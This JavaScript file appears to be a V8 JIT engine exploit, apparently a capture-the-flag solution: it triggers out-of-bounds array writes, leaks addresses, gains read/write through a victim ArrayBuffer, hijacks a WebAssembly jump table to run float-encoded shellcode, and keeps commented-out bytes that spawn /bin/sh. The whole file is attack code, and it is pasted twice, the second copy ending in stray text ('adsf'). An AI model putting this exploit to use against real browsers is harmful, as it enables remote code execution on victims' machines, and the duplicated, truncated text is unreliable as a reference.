let wasm_code = new Uint8Array([0x0,0x61,0x73,0x6D,0x01,0x0,0x0,0x0,0x01,0x85,0x80,0x80,0x80,0x0,0x01,0x60,0x0,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x0,0x01,0x0,0x04,0x84,0x80,0x80,0x80,0x0,0x01,0x70,0x0,0x0,0x05,0x83,0x80,0x80,0x80,0x0,0x01,0x0,0x01,0x06,0x81,0x80,0x80,0x80,0x0,0x0,0x07,0x91,0x80,0x80,0x80,0x0,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x0,0x04,0x6D,0x61,0x69,0x6E,0x0,0x0,0x0A,0x8A,0x80,0x80,0x80,0x0,0x01,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x01,0x0B]);
//let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 0, 3, 124, 124, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 31, 1, 29, 0, 68, 18, 18, 18, 18, 18, 18, 226, 67, 68, 18, 18, 18, 18, 18, 18, 226, 67, 68, 18, 18, 18, 18, 18, 18, 226, 67, 11])
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code),{})
let f = wasm_mod.exports.main;

/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}


let it = 0;
function f2() {
  return [
    4.24958916930194377156629164089E86,
    4.251064202426440343072719871E86,
    4.34562398253533371394213254647E86,
    4.24522998956226658198148050783E86,
    2.63486047652296056448306022844E-284
  ];
}

function foo() {

  let x = 2;
  let bad = x + 2;
  bad = bad - 4;


  let arr2 = [1, 1, 1];
  arr2[bad * 1] = 2;

  /* prevent dead code removal */
  if (it++ > 999999999) {
    arr2[2] = 42;
  }

  let arr1 = [1.1, 1.2, 1.3];


  arr1[bad * 2] = 21; // indicator
  //arr2[bad * 8] = 4;
  arr2[bad * 4] = 10000;// Make the length arr1 much bigger

  if (it++ > 9999999) {
    return;
  }

  let victimo = Object();
  let victimb = new ArrayBuffer(0x800);
  victimo.p1 = 0x41414;
  victimo.obj = {};

  if (arr1[2] == 21) {
    //console.log(arr1);
    //console.log(arr2);
    arr1[10000-1] = 20.0;
    //%DebugPrint(victimo);
    let arr3 = new Float64Array([3.1, 3.2, 3.3, 3.4, 3.5, 3.6]);

    victimo.obj = f;
    addr = (arr1[5].f2i()).hex();
    addr = BigInt("0x" + addr.substring(4, addr.length), 16); // lower bits should be relative address of f
    addr += BigInt(0x10 - 1); // shared_info
    //console.log("Shared info: " + addr.hex());

    //%DebugPrint(f);

    let isolate_ptr = arr1[65].f2i().hex();
    isolate_ptr = BigInt("0x" + isolate_ptr.substring(isolate_ptr.length-4, isolate_ptr.length), 16) << 32n;
    addr |= isolate_ptr;
    console.log(addr.hex());

    arr1[11] = addr.i2f();

    let buf_bytes = new Int32Array(victimb);
    addr = BigInt(buf_bytes[0] + 4*1 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr.hex());

    let buf_bytes2 = new Int32Array(victimb);
    addr = BigInt(buf_bytes2[0]+ 4*5 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr.hex());

    let buf_bytes3 = new Int32Array(victimb);
    addr = BigInt(buf_bytes3[0] + 0x28 - 1);
    addr |= isolate_ptr;

    let jump_table_addr = addr;
    arr1[11] = jump_table_addr.i2f();
    //console.log("Jump table: " + addr.hex()); // address of jump_table

    let buf_bytes4 = new Float64Array(victimb);
    addr = buf_bytes4[0].f2i();
    //arr1[11] = addr.i2f();
    console.log("Jump table: " + addr.hex()); // address of jump_table

    //%DebugPrint(victimb);

    /*
    let buf_bytes = new Int32Array(victimb);
    addr = BigInt(buf_bytes[0] + 4*1 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr)


    */

    //addr = 0x340d2cn; // this points to the turbofan'd f2 compiled code pointer

    addr = 0x3800CCn;
    addr |= isolate_ptr;
    console.log(addr.hex());
    arr1[11] = addr.i2f();

    //%DebugPrint(f2);

    let buf_bytes5 = new DataView(victimb);
    let jit_addr = buf_bytes5.getFloat64(0, true).f2i();
    console.log("Read value: " + jit_addr.hex());
    jit_addr += 0x24bn + 2n; // start of float shellcode
    console.log(jit_addr.hex());

    arr1[11] = jump_table_addr.i2f();
    let buf_bytes6 = new DataView(victimb);
    buf_bytes6.setFloat64(0, jit_addr.i2f(), true);

    //%DebugPrint(f);
    //%SystemBreak();

    f();

    /*
    %DebugPrint(f2);
    %DebugPrint(victimb);
    console.log(read.i2f());
    buf_bytes4.setFloat64(0, read.i2f(), true);
    //addr |= isolate_ptr;
    //arr1[11] = addr.i2f();
    */


    /*


    let shellcode_addr_buf = new Float64Array(victimb);
    let shellcode_addr = shellcode_addr_buf[0].f2i();
    arr1[11] = shellcode_addr.i2f();
    console.log(shellcode_addr.hex());

    //%DebugPrint(victimb);

    let shellcode_buf = new Int8Array(victimb);
    let sc = [0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0x6a,0x3b,0x58,0x99,0x0f,0x05]

    for (let j = 0; j < sc.length; j++) {
      shellcode_buf[j] = sc[j];
    }
    */

    //let buf_bytes = new Int32Array(victimb);

    //arr1[5] = shared_info.i2f();

    //%DebugPrint(arr1);
    /*
    arr1[14] = addr.i2f();
    console.log("Victim buffer overwrite address: " + addr.toString(16));
    %DebugPrint(victimf);
    console.log("Victim buffer:");
    %DebugPrint(victimb);

    let buffer_target = addr - 1;

    %SystemBreak();

    let buf_bytes = new Int32Array(victimb);
    console.log("shared_info: " + buf_bytes[buffer_index].toString(16));
    buffer_index = buf_bytes[buffer_index] - 1 - buffer_target; // index of shared_info
    buffer_index >>= 2;

    %DebugPrint(f);
    %DebugPrint(victimb);
    */
    console.log("Done!");

    //f();
  }
};

function bar() {
  var d = 0.0;

  for (var j = 0; j < 0x100000; j++) {
    d = f2();
  }

  for (var i = 0; i < 0x20000; i++) {
    d = foo();
  }
  console.log("Hi!");
}

bar()
let wasm_code = new Uint8Array([0x0,0x61,0x73,0x6D,0x01,0x0,0x0,0x0,0x01,0x85,0x80,0x80,0x80,0x0,0x01,0x60,0x0,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x0,0x01,0x0,0x04,0x84,0x80,0x80,0x80,0x0,0x01,0x70,0x0,0x0,0x05,0x83,0x80,0x80,0x80,0x0,0x01,0x0,0x01,0x06,0x81,0x80,0x80,0x80,0x0,0x0,0x07,0x91,0x80,0x80,0x80,0x0,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x0,0x04,0x6D,0x61,0x69,0x6E,0x0,0x0,0x0A,0x8A,0x80,0x80,0x80,0x0,0x01,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x01,0x0B]);
//let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 0, 3, 124, 124, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 31, 1, 29, 0, 68, 18, 18, 18, 18, 18, 18, 226, 67, 68, 18, 18, 18, 18, 18, 18, 226, 67, 68, 18, 18, 18, 18, 18, 18, 226, 67, 11])
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code),{})
let f = wasm_mod.exports.main;

/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}


let it = 0;
function f2() {
  return [
    4.24958916930194377156629164089E86,
    4.251064202426440343072719871E86,
    4.34562398253533371394213254647E86,
    4.24522998956226658198148050783E86,
    2.63486047652296056448306022844E-284
  ];
}

function foo() {

  let x = 2;
  let bad = x + 2;
  bad = bad - 4;


  let arr2 = [1, 1, 1];
  arr2[bad * 1] = 2;

  /* prevent dead code removal */
  if (it++ > 999999999) {
    arr2[2] = 42;
  }

  let arr1 = [1.1, 1.2, 1.3];


  arr1[bad * 2] = 21; // indicator
  //arr2[bad * 8] = 4;
  arr2[bad * 4] = 10000;// Make the length arr1 much bigger

  if (it++ > 9999999) {
    return;
  }

  let victimo = Object();
  let victimb = new ArrayBuffer(0x800);
  victimo.p1 = 0x41414;
  victimo.obj = {};

  if (arr1[2] == 21) {
    //console.log(arr1);
    //console.log(arr2);
    arr1[10000-1] = 20.0;
    //%DebugPrint(victimo);
    let arr3 = new Float64Array([3.1, 3.2, 3.3, 3.4, 3.5, 3.6]);

    victimo.obj = f;
    addr = (arr1[5].f2i()).hex();
    addr = BigInt("0x" + addr.substring(4, addr.length), 16); // lower bits should be relative address of f
    addr += BigInt(0x10 - 1); // shared_info
    //console.log("Shared info: " + addr.hex());

    //%DebugPrint(f);

    let isolate_ptr = arr1[65].f2i().hex();
    isolate_ptr = BigInt("0x" + isolate_ptr.substring(isolate_ptr.length-4, isolate_ptr.length), 16) << 32n;
    addr |= isolate_ptr;
    console.log(addr.hex());

    arr1[11] = addr.i2f();

    let buf_bytes = new Int32Array(victimb);
    addr = BigInt(buf_bytes[0] + 4*1 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr.hex());

    let buf_bytes2 = new Int32Array(victimb);
    addr = BigInt(buf_bytes2[0]+ 4*5 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr.hex());

    let buf_bytes3 = new Int32Array(victimb);
    addr = BigInt(buf_bytes3[0] + 0x28 - 1);
    addr |= isolate_ptr;

    let jump_table_addr = addr;
    arr1[11] = jump_table_addr.i2f();
    //console.log("Jump table: " + addr.hex()); // address of jump_table

    let buf_bytes4 = new Float64Array(victimb);
    addr = buf_bytes4[0].f2i();
    //arr1[11] = addr.i2f();
    console.log("Jump table: " + addr.hex()); // address of jump_table

    //%DebugPrint(victimb);

    /*
    let buf_bytes = new Int32Array(victimb);
    addr = BigInt(buf_bytes[0] + 4*1 - 1);
    addr |= isolate_ptr;
    arr1[11] = addr.i2f();
    console.log(addr)


    */

    //addr = 0x340d2cn; // this points to the turbofan'd f2 compiled code pointer

    addr = 0x3800CCn;
    addr |= isolate_ptr;
    console.log(addr.hex());
    arr1[11] = addr.i2f();

    //%DebugPrint(f2);

    let buf_bytes5 = new DataView(victimb);
    let jit_addr = buf_bytes5.getFloat64(0, true).f2i();
    console.log("Read value: " + jit_addr.hex());
    jit_addr += 0x24bn + 2n; // start of float shellcode
    console.log(jit_addr.hex());

    arr1[11] = jump_table_addr.i2f();
    let buf_bytes6 = new DataView(victimb);
    buf_bytes6.setFloat64(0, jit_addr.i2f(), true);

    //%DebugPrint(f);
    //%SystemBreak();

    f();

    /*
    %DebugPrint(f2);
    %DebugPrint(victimb);
    console.log(read.i2f());
    buf_bytes4.setFloat64(0, read.i2f(), true);
    //addr |= isolate_ptr;
    //arr1[11] = addr.i2f();
    */


    /*


    let shellcode_addr_buf = new Float64Array(victimb);
    let shellcode_addr = shellcode_addr_buf[0].f2i();
    arr1[11] = shellcode_addr.i2f();
    console.log(shellcode_addr.hex());

    //%DebugPrint(victimb);

    let shellcode_buf = new Int8Array(victimb);
    let sc = [0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0x6a,0x3b,0x58,0x99,0x0f,0x05]

    for (let j = 0; j < sc.length; j++) {
      shellcode_buf[j] = sc[j];
    }
    */

    //let buf_bytes = new Int32Array(victimb);

    //arr1[5] = shared_info.i2f();

    //%DebugPrint(arr1);
    /*
    arr1[14] = addr.i2f();
    console.log("Victim buffer overwrite address: " + addr.toString(16));
    %DebugPrint(victimf);
    console.log("Victim buffer:");
    %DebugPrint(victimb);

    let buffer_target = addr - 1;

    %SystemBreak();

    let buf_bytes = new Int32Array(victimb);
    console.log("shared_info: " + buf_bytes[buffer_index].toString(16));
    buffer_index = buf_bytes[buffer_index] - 1 - buffer_target; // index of shared_info
    buffer_index >>= 2;

    %DebugPrint(f);
    %DebugPrint(victimb);
    */
    console.log("Done!");

    //f();
  }
};

function bar() {
  var d = 0.0;

  for (var j = 0; j < 0x100000; j++) {
    d = f2();
  }

  for (var i = 0; i < 0x20000; i++) {
    d = foo();
  }
  console.log("Hi!");
}

adsf
